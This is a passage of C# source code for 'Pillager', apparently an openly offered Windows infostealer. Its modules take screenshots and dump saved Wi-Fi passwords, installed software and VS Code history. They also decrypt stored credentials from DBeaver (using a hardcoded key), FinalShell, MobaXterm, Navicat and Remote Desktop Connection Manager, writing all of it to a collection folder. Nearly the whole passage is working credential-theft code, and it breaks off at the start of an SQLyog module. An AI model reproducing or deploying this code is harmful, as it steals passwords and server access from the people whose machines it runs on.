                string info = File.ReadAllText(infopath);
                if (string.IsNullOrEmpty(info)) return;
                string savepath = Path.Combine(path, SoftwareName);
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "userinfo.url"), " [InternetShortcut]\r\nURL=https://music.163.com/#/user/home?id=" + info);
            }
            catch { }
        }
    }
}

```

`Pillager/Softwares/VSCode.cs`:

```cs
using System;
using System.IO;
using Pillager.Helper;

namespace Pillager.Softwares
{
    internal class VSCode
    {
        public static string SoftwareName = "VSCode";

        public static void Save(string path)
        {
            try
            {
                string historypath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code\\User\\History");
                if (!Directory.Exists(historypath)) return;
                string savepath = Path.Combine(path, SoftwareName);
                Directory.CreateDirectory(savepath);
                Methods.CopyDirectory(historypath, Path.Combine(savepath, "History"), true);
            }
            catch { }
        }
    }
}

```

`Pillager/SystemInfos/InstalledApp.cs`:

```cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.SystemInfos
{
    internal class InstalledApp
    {
        public static string SystemInfoName = "InstalledApp";

        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall"))
                    foreach (var subkey in key.GetSubKeyNames())
                    {
                        string value = key.OpenSubKey(subkey)?.GetValue("DisplayName", "Error").ToString();
                        if (!string.IsNullOrEmpty(value) && value != "Error" && !value.Contains("Windows"))
                            sb.AppendLine(value);
                    }
            }
            catch
            { }
            return sb.ToString();
        }
        public static void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, SystemInfoName);
                string result = GetInfo();
                if (!string.IsNullOrEmpty(result))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, SystemInfoName + ".txt"), result);
                }
            }
            catch { }
        }
    }
}

```

`Pillager/SystemInfos/ScreenShot.cs`:

```cs
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Pillager.Helper;

namespace Pillager.SystemInfos
{
    internal class ScreenShot
    {
        public static string SystemInfoName = "ScreenShot";

        public static void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, SystemInfoName);
                try
                {
                    Native.SetProcessDPIAware();
                }
                catch { }
                if (Screen.AllScreens.Length > 0)
                {
                    Directory.CreateDirectory(savepath);
                    for (int i = 0; i < Screen.AllScreens.Length; i++)
                    {
                        Screen screen = Screen.AllScreens[i];
                        using (Bitmap bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb))
                        {
                            using (Graphics graphics = Graphics.FromImage(bitmap))
                            {
                                graphics.CopyFromScreen(screen.Bounds.Left, screen.Bounds.Top, 0, 0, new Size(bitmap.Width, bitmap.Height), CopyPixelOperation.SourceCopy);
                            }
                            bitmap.Save(Path.Combine(savepath, SystemInfoName + i + ".jpg"), ImageFormat.Jpeg);
                        }
                    }
                }
            }
            catch { }
        }
    }
}

```

`Pillager/SystemInfos/Wifi.cs`:

```cs
using System;
using System.IO;
using System.Text;
using System.Xml;
using Pillager.Helper;

namespace Pillager.SystemInfos
{
    internal class Wifi
    {
        public static string SystemInfoName = "Wifi";
        private static string GetMessage()
        {
            const int dwClientVersion = 2;
            IntPtr clientHandle = IntPtr.Zero;
            IntPtr pInterfaceList = IntPtr.Zero;
            Native.WLAN_INTERFACE_INFO_LIST interfaceList;
            Native.WLAN_PROFILE_INFO_LIST wifiProfileList;
            Guid InterfaceGuid;
            IntPtr profileList = IntPtr.Zero;
            string profileName;
            StringBuilder sb = new StringBuilder();

            try
            {
                // Open Wifi Handle
                Native.WlanOpenHandle(dwClientVersion, IntPtr.Zero, out _, ref clientHandle);

                Native.WlanEnumInterfaces(clientHandle, IntPtr.Zero, ref pInterfaceList);
                interfaceList = new Native.WLAN_INTERFACE_INFO_LIST(pInterfaceList);
                InterfaceGuid = interfaceList.InterfaceInfo[0].InterfaceGuid;
                Native.WlanGetProfileList(clientHandle, InterfaceGuid, IntPtr.Zero, ref profileList);
                wifiProfileList = new Native.WLAN_PROFILE_INFO_LIST(profileList);
                if (wifiProfileList.dwNumberOfItems <= 0) return null;
                sb.AppendLine("Found " + wifiProfileList.dwNumberOfItems + " SSIDs: ");
                sb.AppendLine("============================");
                sb.AppendLine("");

                for (int i = 0; i < wifiProfileList.dwNumberOfItems; i++)
                {
                    try
                    {
                        profileName = (wifiProfileList.ProfileInfo[i]).strProfileName;
                        int decryptKey = 63;
                        Native.WlanGetProfile(clientHandle, InterfaceGuid, profileName, IntPtr.Zero, out var wifiXmlProfile, ref decryptKey, out _);
                        XmlDocument xmlProfileXml = new XmlDocument();
                        xmlProfileXml.LoadXml(wifiXmlProfile);
                        XmlNodeList pathToSSID = xmlProfileXml.SelectNodes("//*[name()='WLANProfile']/*[name()='SSIDConfig']/*[name()='SSID']/*[name()='name']");
                        XmlNodeList pathToPassword = xmlProfileXml.SelectNodes("//*[name()='WLANProfile']/*[name()='MSM']/*[name()='security']/*[name()='sharedKey']/*[name()='keyMaterial']");
                        foreach (XmlNode ssid in pathToSSID)
                        {
                            sb.AppendLine("SSID: " + ssid.InnerText);
                            foreach (XmlNode password in pathToPassword)
                            {
                                sb.AppendLine("Password: " + password.InnerText);
                            }
                            sb.AppendLine("----------------------------");
                        }
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine(ex.Message);
                    }
                }
                Native.WlanCloseHandle(clientHandle, IntPtr.Zero);
            }
            catch { }
            return sb.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, SystemInfoName);
                string wifi = GetMessage();
                if (!string.IsNullOrEmpty(wifi))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, SystemInfoName + ".txt"), wifi);
                }
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/DBeaver.cs`:

```cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Tools
{
    internal class DBeaver
    {
        public static string ToolName = "DBeaver";

        public static string ConnectionInfo(string config, string sources)
        {
            StringBuilder sb = new StringBuilder();
            string pattern = @"\""(?<key>[^""]+)\""\s*:\s*\{\s*\""#connection\""\s*:\s*\{\s*\""user\""\s*:\s*\""(?<user>[^""]+)\""\s*,\s*\""password\""\s*:\s*\""(?<password>[^""]+)\""\s*\}\s*\}";
            MatchCollection matches = Regex.Matches(config, pattern);
            foreach (Match match in matches)
            {
                string key = match.Groups["key"].Value;
                string user = match.Groups["user"].Value;
                string password = match.Groups["password"].Value;
                sb.AppendLine(MatchDataSource(File.ReadAllText(sources), key));
                sb.AppendLine($"username: {user}");
                sb.AppendLine($"password: {password}");
                sb.AppendLine();
            }
            return sb.ToString();
        }

        public static string MatchDataSource(string json, string jdbcKey)
        {
            string pattern = $"\"({Regex.Escape(jdbcKey)})\":\\s*{{[^}}]+?\"url\":\\s*\"([^\"]+)\"[^}}]+?}}";
            Match match = Regex.Match(json, pattern);
            if (match.Success)
            {
                string url = match.Groups[2].Value;
                return $"host: {url}";
            }
            return "";
        }

        public static string GetAppDataFolderPath()
        {
            string appDataFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            return appDataFolderPath;
        }
        public static string Decrypt(string filePath, string keyHex, string ivHex)
        {
            byte[] encryptedBytes = File.ReadAllBytes(filePath);
            byte[] key = StringToByteArray(keyHex);
            byte[] iv = StringToByteArray(ivHex);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream, Encoding.UTF8))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
        private static byte[] StringToByteArray(string hex)
        {
            int numberChars = hex.Length;
            byte[] bytes = new byte[numberChars / 2];
            for (int i = 0; i < numberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }

        public static void Save(string path)
        {
            try
            {
                string sources = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData\\workspace6\\General\\.dbeaver\\data-sources.json");
                string credentials = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData\\workspace6\\General\\.dbeaver\\credentials-config.json");
                if (!File.Exists(sources)||!File.Exists(credentials))return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                string output = ConnectionInfo(Decrypt(credentials, "babb4a9f774ab853c96c2d653dfe544a", "00000000000000000000000000000000"), sources);
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/FinalShell.cs`:

```cs
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Tools
{
    internal class FinalShell
    {
        public static string ToolName = "FinalShell";

        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\conn";
            foreach (var file in Directory.GetFiles(connPath))
            {
                if (!file.EndsWith("_connect_config.json")) continue;
                string connjson = File.ReadAllText(file);
                string user_name = ""; 
                string password = ""; 
                string host = "";
                string port = "";
                var user_names = new Regex("\"user_name\":\"(.*?)\"", RegexOptions.Compiled).Matches(connjson);
                var passwords = new Regex("\"password\":\"(.*?)\"", RegexOptions.Compiled).Matches(connjson);
                var hosts = new Regex("\"host\":\"(.*?)\"", RegexOptions.Compiled).Matches(connjson);
                var ports = new Regex("\"port\":(.*?),", RegexOptions.Compiled).Matches(connjson);
                foreach (Match prof in user_names)
                {
                    if (prof.Success)
                        user_name = prof.Groups[1].Value;
                }
                foreach (Match prof in passwords)
                {
                    if (prof.Success)
                        password = prof.Groups[1].Value;
                }
                foreach (Match prof in hosts)
                {
                    if (prof.Success)
                        host = prof.Groups[1].Value;
                }
                foreach (Match prof in ports)
                {
                    if (prof.Success)
                        port = prof.Groups[1].Value;
                }
                sb.AppendLine("host: "+ host);
                sb.AppendLine("port: " + port);
                sb.AppendLine("user_name: " + user_name);
                sb.AppendLine("password: " + decodePass(password));
                sb.AppendLine();
            }
            return sb.ToString();
        }

        public static byte[] desDecode(byte[] data, byte[] head)
        {
            byte[] TripleDesIV = { 0, 0, 0, 0, 0, 0, 0, 0 };
            byte[] key = new byte[8];
            Array.Copy(head, key, 8);
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            des.Key = key;
            des.IV = TripleDesIV; 
            des.Padding = PaddingMode.PKCS7;
            des.Mode = CipherMode.ECB;
            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }

        public static string decodePass(string data)
        {
            if (data == null)
            {
                return null;
            }

            byte[] buf = Convert.FromBase64String(data);
            byte[] head = new byte[8];
            Array.Copy(buf, 0, head, 0, head.Length);
            byte[] d = new byte[buf.Length - head.Length];
            Array.Copy(buf, head.Length, d, 0, d.Length);
            byte[] randombytes = ranDomKey(head);
            byte[] bt = desDecode(d, randombytes);
            var rs = Encoding.ASCII.GetString(bt);

            return rs;
        }
        static byte[] ranDomKey(byte[] head)
        {
            long ks = 3680984568597093857L / new JavaRng(head[5]).nextInt(127);
            JavaRng random = new JavaRng(ks);
            int t = head[0];

            for (int i = 0; i < t; ++i)
            {
                random.nextLong();
            }

            long n = random.nextLong();
            JavaRng r2 = new JavaRng(n);
            long[] ld = { head[4], r2.nextLong(), head[7], head[3], r2.nextLong(), head[1], random.nextLong(), head[2] };
            using (MemoryStream stream = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    long[] var15 = ld;
                    int var14 = ld.Length;

                    for (int var13 = 0; var13 < var14; ++var13)
                    {
                        long l = var15[var13];

                        try
                        {
                            byte[] writeBuffer = new byte[8];
                            writeBuffer[0] = (byte)(l >> 56);
                            writeBuffer[1] = (byte)(l >> 48);
                            writeBuffer[2] = (byte)(l >> 40);
                            writeBuffer[3] = (byte)(l >> 32);
                            writeBuffer[4] = (byte)(l >> 24);
                            writeBuffer[5] = (byte)(l >> 16);
                            writeBuffer[6] = (byte)(l >> 8);
                            writeBuffer[7] = (byte)(l >> 0);
                            writer.Write(writeBuffer);
                        }
                        catch
                        {
                            return null;
                        }
                    }

                    byte[] keyData = stream.ToArray();
                    keyData = md5(keyData);
                    return keyData;
                }
            }
        }

        public static byte[] md5(byte[] data)
        {
            try
            {
                MD5 md5Hash = MD5.Create();
                byte[] md5data = md5Hash.ComputeHash(data);
                return md5data;
            }
            catch
            { return null; }
        }

        public static void Save(string path)
        {
            try
            {
                string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\conn";
                if (!Directory.Exists(connPath)) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
            }
            catch { }
        }
    }
    public sealed class JavaRng
    {
        public JavaRng(long seed)
        {
            _seed = (seed ^ LARGE_PRIME) & ((1L << 48) - 1);
        }

        public long nextLong()
        {
            return ((long)next(32) << 32) + next(32);
        }

        public int nextInt(int bound)
        {
            if (bound <= 0)
                throw new ArgumentOutOfRangeException(nameof(bound), bound, "bound must be positive");

            int r = next(31);
            int m = bound - 1;
            if ((bound & m) == 0)  // i.e., bound is a power of 2
                r = (int)((bound * (long)r) >> 31);
            else
            {
                for (int u = r;
                     u - (r = u % bound) + m < 0;
                     u = next(31))
                    ;
            }
            return r;
        }

        private int next(int bits)
        {
            _seed = (_seed * LARGE_PRIME + SMALL_PRIME) & ((1L << 48) - 1);
            return (int)((_seed) >> (48 - bits));
        }

        private long _seed;

        private const long LARGE_PRIME = 0x5DEECE66DL;
        private const long SMALL_PRIME = 0xBL;
    }
}

```

`Pillager/Tools/MobaXterm.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal class MobaXterm
    {
        public static string ToolName = "MobaXterm";

        public static string FromINI(List<string> pathlist)
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (var path in pathlist)
            {
                try
                {
                    var p = Pixini.Load(path);
                    string SessionP = p.Get("SessionP", "Misc", "");
                    if (string.IsNullOrEmpty(SessionP)) continue;
                    string Sesspasses = p.Get((Environment.UserName + "@" + Environment.MachineName).Replace(" ",""), "Sesspass", "");

                    List<string> passwordlist = new List<string>();
                    p.sectionMap.TryGetValue("passwords", out var passwords);
                    if (passwords!=null)
                    {
                        foreach (var password in passwords)
                        {
                            string key = password.key;
                            string value = password.value;
                            try
                            {
                                if (string.IsNullOrEmpty(Sesspasses))
                                {
                                    string decryptvalue = DecryptWithoutMP(SessionP, value);
                                    passwordlist.Add(key + "=" + decryptvalue);
                                }
                                else
                                {
                                    string decryptvalue = DecryptWithMP(SessionP, Sesspasses, value);
                                    passwordlist.Add(key + "=" + decryptvalue);
                                }
                            }
                            catch { }
                        }
                    }

                    List<string> credentiallist = new List<string>();
                    p.sectionMap.TryGetValue("credentials", out var credentials);
                    if (credentials!=null)
                    {
                        foreach (var credential in credentials)
                        {
                            string name = credential.key;
                            string value = credential.value;
                            try
                            {
                                string username = value.Split(':')[0];
                                if (string.IsNullOrEmpty(Sesspasses))
                                {
                                    string decryptvalue = DecryptWithoutMP(SessionP, value.Split(':')[1]);
                                    credentiallist.Add(name + "=" + username + ":" + decryptvalue);
                                }
                                else
                                {
                                    string decryptvalue = DecryptWithMP(SessionP, Sesspasses, value.Split(':')[1]);
                                    credentiallist.Add(name + "=" + username + ":" + decryptvalue);
                                }
                            }
                            catch { }
                        }
                    }
                    
                    if (passwordlist?.Count > 0)
                    {
                        stringBuilder.AppendLine("Passwords:");
                        foreach (var password in passwordlist)
                        {
                            stringBuilder.AppendLine(password);
                        }
                        stringBuilder.AppendLine("");
                    }
                    if (credentiallist?.Count > 0)
                    {
                        stringBuilder.AppendLine("Credentials:");
                        foreach (var credential in credentiallist)
                        {
                            stringBuilder.AppendLine(credential);
                        }
                        stringBuilder.AppendLine("");
                    }
                }
                catch { }
            }

            return stringBuilder.ToString();
        }

        public static string FromRegistry()
        {
            StringBuilder stringBuilder = new StringBuilder();
            List<string> passwordlist = new List<string>();
            List<string> credentiallist = new List<string>();
            try
            {
                RegistryKey MobaXtermkey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm");
                string SessionP = (string)MobaXtermkey.GetValue("SessionP");
                string masterpassword = "";
                try
                {
                    string temp = Environment.UserName + "@" + Environment.MachineName;
                    masterpassword = (string)MobaXtermkey.OpenSubKey("M").GetValue(temp.Replace(" ",""));
                }
                catch { }
                try
                {
                    foreach (string SubkeyName in MobaXtermkey.OpenSubKey("P").GetValueNames())
                    {
                        try
                        {
                            string key = SubkeyName;
                            string value = (string)MobaXtermkey.OpenSubKey("P").GetValue(SubkeyName);
                            if (string.IsNullOrEmpty(masterpassword))
                            {
                                string decryptvalue = DecryptWithoutMP(SessionP, value);
                                passwordlist.Add(key + "=" + decryptvalue);
                            }
                            else
                            {
                                string decryptvalue = DecryptWithMP(SessionP, masterpassword, value);
                                passwordlist.Add(key + "=" + decryptvalue);
                            }
                        }
                        catch { }
                    }
                }
                catch { }
                try
                {
                    foreach (string SubkeyName in MobaXtermkey.OpenSubKey("C").GetValueNames())
                    {
                        try
                        {
                            string key = SubkeyName;
                            string value = (string)MobaXtermkey.OpenSubKey("C").GetValue(SubkeyName);
                            if (string.IsNullOrEmpty(masterpassword))
                            {
                                string decryptvalue = DecryptWithoutMP(SessionP, value);
                                credentiallist.Add(key + "=" + decryptvalue);
                            }
                            else
                            {
                                string decryptvalue = DecryptWithMP(SessionP, masterpassword, value);
                                credentiallist.Add(key + "=" + decryptvalue);
                            }
                        }
                        catch { }
                    }
                }
                catch { }
                if (passwordlist.Count > 0)
                {
                    stringBuilder.AppendLine("Passwords:");
                    foreach (var password in passwordlist)
                    {
                        stringBuilder.AppendLine(password);
                    }
                    stringBuilder.AppendLine("");
                }
                if (credentiallist.Count > 0)
                {
                    stringBuilder.AppendLine("Credentials:");
                    foreach (var credential in credentiallist)
                    {
                        stringBuilder.AppendLine(credential);
                    }
                    stringBuilder.AppendLine("");
                }
                return stringBuilder.ToString();
            }
            catch { }            
            return null;
        }

        public static string DecryptWithMP(string SessionP, string Sesspasses, string Ciphertext)
        {
            byte[] bytes = Convert.FromBase64String(Sesspasses);
            //byte[] key = KeyCrafter(SessionP);
            byte[] front = { 0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf, 0x01, 0x15, 0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0, 0x4f, 0xc2, 0x97, 0xeb };
            byte[] all = new byte[bytes.Length + front.Length];
            for (int i = 0; i < front.Length; i++)
            {
                all[i] = front[i];
            }
            for (int i = 0; i < bytes.Length; i++)
            {
                all[front.Length + i] = bytes[i];
            }
            byte[] temp = ProtectedData.Unprotect(all, Encoding.UTF8.GetBytes(SessionP), DataProtectionScope.CurrentUser);
            string temp2 = Encoding.UTF8.GetString(temp);
            byte[] output = Convert.FromBase64String(temp2);

            byte[] text = Convert.FromBase64String(Ciphertext);

            byte[] aeskey = new byte[32];
            Array.Copy(output, aeskey, 32);
            byte[] temp3 = new byte[16];

            byte[] ivbytes = AESEncrypt(temp3, aeskey);
            byte[] iv = new byte[16];
            Array.Copy(ivbytes, iv, 16);
            string t1 = AESDecrypt(text, aeskey, iv);
            return t1;
        }

        public static string DecryptWithoutMP(string SessionP, string Ciphertext)
        {
            byte[] key = KeyCrafter(SessionP);
            byte[] text = Encoding.ASCII.GetBytes(Ciphertext);

            List<byte> bytes1 = new List<byte>();
            foreach (var t in text)
            {
                if (key.ToList().Contains(t))
                {
                    bytes1.Add(t);
                }
            }
            byte[] ct = bytes1.ToArray();

            List<byte> ptarray = new List<byte>();

            if (ct.Length % 2 == 0)
            {
                for (int i = 0; i < ct.Length; i += 2)
                {
                    int l = key.ToList().FindIndex(a => a == ct[i]);
                    key = RightBytes(key);
                    int h = key.ToList().FindIndex(a => a == ct[i + 1]);
                    key = RightBytes(key);
                    ptarray.Add((byte)(16 * h + l));
                }
                byte[] pt = ptarray.ToArray();
                return Encoding.UTF8.GetString(pt);
            }
            return "";
        }

        public static byte[] RightBytes(byte[] input)
        {
            byte[] bytes = new byte[input.Length];
            for (int i = 0; i < input.Length-1; i++)
            {
                bytes[i + 1] = input[i];
            }
            bytes[0] = input[input.Length - 1];
            return bytes;
        }

        public static List<string> GetINI()
        {
            List<string> pathlist = new List<string>();
            foreach (var process in Process.GetProcesses())
            {
                if (process.ProcessName.Contains(ToolName))
                {
                    try
                    {
                        pathlist.Add(Path.Combine(Path.GetDirectoryName(process.MainModule.FileName), "MobaXterm.ini"));
                    }
                    catch { }
                }
            }
            string installedpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MobaXterm\\MobaXterm.ini");
            if (File.Exists(installedpath)) { pathlist.Add(installedpath); }
            return pathlist;
        }

        private static string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
        {
            MemoryStream mStream = new MemoryStream(encryptedBytes);
            RijndaelManaged aes = new RijndaelManaged();
            aes.Mode = CipherMode.CFB;
            aes.FeedbackSize = 8;
            aes.Padding = PaddingMode.Zeros;
            aes.Key = bKey;
            aes.IV = iv;
            CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
            try
            {
                byte[] tmp = new byte[encryptedBytes.Length + 32];
                int len = cryptoStream.Read(tmp, 0, encryptedBytes.Length + 32);
                byte[] ret = new byte[len];
                Array.Copy(tmp, 0, ret, 0, len);
                return Encoding.UTF8.GetString(ret);
            }
            finally
            {
                cryptoStream.Close();
                mStream.Close();
                aes.Clear();
            }
        }

        private static byte[] AESEncrypt(byte[] plainBytes, byte[] bKey)
        {
            MemoryStream mStream = new MemoryStream();
            RijndaelManaged aes = new RijndaelManaged();

            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = bKey;
            CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
            try
            {
                cryptoStream.Write(plainBytes, 0, plainBytes.Length);
                cryptoStream.FlushFinalBlock();
                return mStream.ToArray();
            }
            finally
            {
                cryptoStream.Close();
                mStream.Close();
                aes.Clear();
            }
        }

        public static byte[] KeyCrafter(string SessionP)
        {
            while (SessionP.Length < 20)
            {
                SessionP += SessionP;
            }
            string s1 = SessionP;
            string s2 = Environment.UserName + Environment.UserDomainName;
            while (s2.Length < 20)
            {
                s2 += s2;
            }
            string[] key_space = { s1.ToUpper(), s1.ToUpper(), s1.ToLower(), s1.ToLower() };
            byte[] key = Encoding.UTF8.GetBytes("0d5e9n1348/U2+67");

            for (int i = 0; i < key.Length; i++)
            {
                byte b = (byte)key_space[(i + 1) % (key_space).Length][i];
                if (!key.Contains(b) && Encoding.UTF8.GetBytes("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/").Contains(b))
                {
                    key[i] = b;
                }
            }
            return key;
        }

        public static void Save(string path)
        {
            try
            {
                List<string> pathlist=GetINI();
                if (pathlist.Count==0) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                string registryout = FromRegistry();
                string iniout = FromINI(pathlist);
                string output = registryout + iniout;
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/Navicat.cs`:

```cs
using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal class Navicat
    {
        public static string ToolName = "Navicat";

        public static string DecryptPwd()
        {
            StringBuilder sb = new StringBuilder();
            Navicat11Cipher Decrypt = new Navicat11Cipher();

            var dictionary = new Dictionary<string, string>
            {
                { "Navicat", "MySql" },
                { "NavicatMSSQL", "SQL Server" },
                { "NavicatOra", "Oracle" },
                { "NavicatPG", "pgsql" },
                { "NavicatMARIADB", "MariaDB" },
                { "NavicatMONGODB","MongoDB"},
                { "NavicatSQLite","SQLite"}
            };

            foreach (var key in dictionary.Keys)
            {
                var registryKey = Registry.CurrentUser.OpenSubKey($@"Software\PremiumSoft\{key}\Servers");
                if (registryKey == null) continue;
                sb.AppendLine($"DatabaseName: {dictionary[key]}");

                foreach (string rname in registryKey.GetSubKeyNames())
                {
                    RegistryKey installedapp = registryKey.OpenSubKey(rname);
                    if (installedapp != null)
                    {
                        try
                        {
                            var hostname = installedapp.GetValue("Host").ToString();
                            var username = installedapp.GetValue("UserName").ToString();
                            var password = installedapp.GetValue("Pwd").ToString();

                            sb.AppendLine("ConnectName: " + rname);
                            sb.AppendLine("hostname: " + hostname);
                            sb.AppendLine("ConnectName: " + username);
                            sb.AppendLine("password: " + Decrypt.DecryptString(password));
                            sb.AppendLine();
                        }
                        catch
                        { }
                    }
                }
            }
            return sb.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                var registryKey = Registry.CurrentUser.OpenSubKey(@"Software\PremiumSoft");
                if (registryKey == null) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                string output = DecryptPwd();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/RDCMan.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Pillager.Tools
{
    internal class RDCMan
    {
        public static string ToolName = "RDCMan";

        public static string DecryptPwd()
        {
            StringBuilder sb = new StringBuilder();
            var RDGFiles = new List<string>();
            var RDCManSettings = new XmlDocument();
            string rdgPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Remote Desktop Connection Manager\RDCMan.settings";
            RDCManSettings.LoadXml(File.ReadAllText(rdgPath));
            var nodes = RDCManSettings.SelectNodes("//FilesToOpen");
            foreach (XmlNode node in nodes)
            {
                var RDGFilePath = node.InnerText;
                if (!RDGFiles.Contains(RDGFilePath))
                {
                    RDGFiles.Add(RDGFilePath);
                }
            }
            foreach (string RDGFile in RDGFiles)
            {
                sb.AppendLine(ParseRDGFile(RDGFile));
            }
            return sb.ToString();
        }

        private static string DecryptPassword(string password)
        {
            byte[] passwordBytes = Convert.FromBase64String(password);
            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser)).Replace("\0", "");
            return password;
        }

        private static string ParseRDGFile(string RDGPath)
        {
            StringBuilder stringBuilder = new StringBuilder();
            try
            {
                XmlDocument RDGFileConfig = new XmlDocument();
                RDGFileConfig.LoadXml(File.ReadAllText(RDGPath));
                XmlNodeList nodes = RDGFileConfig.SelectNodes("//server");
                foreach (XmlNode node in nodes)
                {
                    string hostname = string.Empty, profilename = string.Empty, username = string.Empty, password = string.Empty, domain = string.Empty;
                    foreach (XmlNode subnode in node)
                    {
                        foreach (XmlNode subnode_1 in subnode)
                        {
                            switch (subnode_1.Name)
                            {
                                case "name":
                                    hostname = subnode_1.InnerText;
                                    break;
                                case "profileName":
                                    profilename = subnode_1.InnerText;
                                    break;
                                case "userName":
                                    username = subnode_1.InnerText;
                                    break;
                                case "password":
                                    password = subnode_1.InnerText;
                                    break;
                                case "domain":
                                    domain = subnode_1.InnerText;
                                    break;
                            }
                        }
                    }

                    if (!string.IsNullOrEmpty(password))
                    {
                        var decrypted = DecryptPassword(password);
                        if (!string.IsNullOrEmpty(decrypted))
                        {
                            stringBuilder.AppendLine("hostname: " + hostname);
                            stringBuilder.AppendLine("profilename: " + profilename);
                            stringBuilder.AppendLine("username: " + $"{domain}\\{username}");
                            stringBuilder.AppendLine("decrypted: " + decrypted);
                            stringBuilder.AppendLine();
                        }
                    }
                }
            }
            catch { }
            return stringBuilder.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                string rdgPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Remote Desktop Connection Manager\RDCMan.settings";
                if (!File.Exists(rdgPath)) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                string output = DecryptPwd();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
            }
            catch { }
        }
    }
}

```

`Pillager/Tools/SQLyog.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal class SQLyog
    {
        public static string ToolName = "SQLyog";

